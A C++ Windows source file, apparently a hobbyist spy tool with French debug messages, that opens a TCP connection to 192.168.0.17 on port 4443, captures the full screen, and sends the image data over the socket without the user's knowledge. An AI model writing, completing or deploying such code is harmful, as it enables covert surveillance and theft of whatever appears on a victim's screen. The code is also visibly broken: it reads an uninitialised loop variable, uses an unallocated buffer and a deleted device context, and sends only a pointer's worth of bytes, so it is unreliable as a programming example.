#include <ctime>
#include <cstdlib>
#include <Windows.h>
#include <winsock2.h>
#include <winable.h>
#include <Wingdi.h>
#include <gdiplus.h>
#include <conio.h>
#include <stdio.h>
#include <iostream>
#include <fstream>

using namespace std;

int main()
{
      SOCKET s1;
      WSADATA wsaData;
      struct sockaddr_in hax;
      WSAStartup(MAKEWORD(2, 2), &wsaData);
      s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
      hax.sin_family = AF_INET;
      hax.sin_port = htons(4443);
      hax.sin_addr.s_addr = inet_addr("192.168.0.17");
      int test;
      while (test != 0)
      {
            test = WSAConnect(s1, (SOCKADDR *)&hax, sizeof(hax), NULL, NULL, NULL, NULL);
      }
      int x = GetSystemMetrics(SM_CXSCREEN);
      int y = GetSystemMetrics(SM_CYSCREEN);
      void *lpBits;
      HDC hScreenDC = CreateDC("DISPLAY", NULL, NULL, NULL);
      HDC hMemoryDC = CreateCompatibleDC(hScreenDC);
      HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, x, y);
      HBITMAP hOldBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);
      if(!BitBlt(hMemoryDC, 0, 0, x, y, hScreenDC, 0 , 0, SRCCOPY))
            cout << "nitblt marche pas"  << endl;
      hBitmap = (HBITMAP)SelectObject(hMemoryDC, hOldBitmap);

      DeleteDC(hMemoryDC);
      DeleteDC(hScreenDC);

      int padding;
      BITMAPINFO bmi;
      bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
      bmi.bmiHeader.biWidth = x;
      bmi.bmiHeader.biHeight = y;
      bmi.bmiHeader.biBitCount = 24; 
      bmi.bmiHeader.biPlanes = 1;
      bmi.bmiHeader.biCompression = BI_RGB; 
      bmi.bmiHeader.biSizeImage = 0;
      bmi.bmiHeader.biXPelsPerMeter = 0; 
      bmi.bmiHeader.biYPelsPerMeter = 0; 
      bmi.bmiHeader.biClrUsed = 0; 
      bmi.bmiHeader.biClrImportant = 0; 

      if (GetDIBits(hMemoryDC, hBitmap, 0, y, lpBits, &bmi, DIB_RGB_COLORS) == ERROR_INVALID_PARAMETER)
            cout << "paramètres invalides" << endl;
      else if (GetDIBits(hMemoryDC, hBitmap, 0, y, (void*)lpBits, &bmi, DIB_RGB_COLORS))
      {
            send(s1, (char*)lpBits, sizeof(lpBits), 0);
            cout << "yes" << endl;
      }
      else  
            cout << "marche pas" << endl;
     
      system("pause");
      return 0;
}